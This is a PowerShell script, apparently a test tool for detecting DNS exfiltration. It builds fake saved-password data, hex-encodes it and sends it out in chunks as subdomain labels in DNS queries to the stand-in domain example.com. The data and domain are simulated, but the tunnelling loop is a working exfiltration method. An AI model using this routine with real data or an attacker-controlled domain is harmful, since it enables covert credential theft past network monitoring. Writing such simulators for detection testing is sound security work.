# ============================================================
# BROWSER DATA EXFILTRATION SIMULATOR (HEX DNS)
# ============================================================

# CONFIGURATION
$TargetDomain = "example.com"
$SpecificDNS = "8.8.8.8"  # Force traffic to Google DNS
$ChunkSize = 60           # Max chars per subdomain label

# 1. SIMULATE STOLEN BROWSER DATA
# We generate a large fake dataset representing saved passwords and history.
Write-Host "Harvesting fake browser data..." -ForegroundColor Cyan

$BrowserData = "HEADER:CHROME_DUMP_V2|OS:Windows10|USER:Admin;"
# Add simulated entries to make the payload large (creating 100+ queries)
for ($i = 1; $i -le 40; $i++) {
    $BrowserData += "URL:https://www.facebook.com|USER:mark_zuckerberg_$i|PASS:FaceBookPass$i;"
    $BrowserData += "URL:https://banking.secure-login.com|USER:client_id_$i|PASS:MySecretBankCode_$i;"
    $BrowserData += "URL:https://netflix.com|USER:movie_watcher_$i@gmail.com|PASS:NetflixChill$i;"
}
$BrowserData += "FOOTER:END_OF_STREAM"

Write-Host "Payload created."
Write-Host "Total Data Size: $( $BrowserData.Length ) bytes (ASCII)" -ForegroundColor Yellow

# 2. ENCODE TO HEX
# Convert the text to Hexadecimal string
$Bytes = [System.Text.Encoding]::UTF8.GetBytes($BrowserData)
$HexPayload = [System.BitConverter]::ToString($Bytes).Replace("-", "")

Write-Host "Hex Payload Size: $( $HexPayload.Length ) characters"
Write-Host "Estimated DNS Queries: $( [Math]::Ceiling($HexPayload.Length / $ChunkSize) )"
Write-Host "--------------------------------------------------"

# 3. EXFILTRATION LOOP
$Offset = 0
$Sequence = 1
$SessionID = Get-Random -Minimum 1000 -Maximum 9999

# Logging setup
$DesktopPath = [Environment]::GetFolderPath("Desktop")
$LogFile = "$DesktopPath\browser_dump_log.txt"
$LogContent = @()

Write-Host "Starting Exfiltration to $TargetDomain..." -ForegroundColor Cyan

while ($Offset -lt $HexPayload.Length) {
    
    # Calculate chunk size
    if (($Offset + $ChunkSize) -gt $HexPayload.Length) {
        $Length = $HexPayload.Length - $Offset
    } else {
        $Length = $ChunkSize
    }
    
    # Get the chunk of HEX data
    $Chunk = $HexPayload.Substring($Offset, $Length)
    
    # Construct the Malicious Domain
    # Format: [HEX_DATA].[SEQUENCE].[SESSION_ID].[DOMAIN]
    $FQDN = "$Chunk.$Sequence.$SessionID.$TargetDomain"
    
    try {
        # Send DNS Query (Using TXT type to simulate C2 traffic, or A type)
        $null = Resolve-DnsName -Name $FQDN -Type A -Server $SpecificDNS -ErrorAction SilentlyContinue
        
        # Log minimal info to console to keep it fast
        if ($Sequence % 10 -eq 0) {
            Write-Host "Sent packet #$Sequence ($Chunk...)" -ForegroundColor Green
        }
        
        $LogContent += "SEQ: $Sequence | DATA: $Chunk"
    }
    catch {
        Write-Host "Packet #$Sequence failed." -ForegroundColor Red
    }
    
    # Update counters
    $Offset += $ChunkSize
    $Sequence++
    
    # Slight delay (20ms) to create a steady stream instead of a burst
    Start-Sleep -Milliseconds 20
}

# 4. SAVE LOG
$LogContent | Out-File -FilePath $LogFile -Encoding UTF8
Write-Host "--------------------------------------------------"
Write-Host "Exfiltration Complete."
Write-Host "Log saved to Desktop: browser_dump_log.txt"
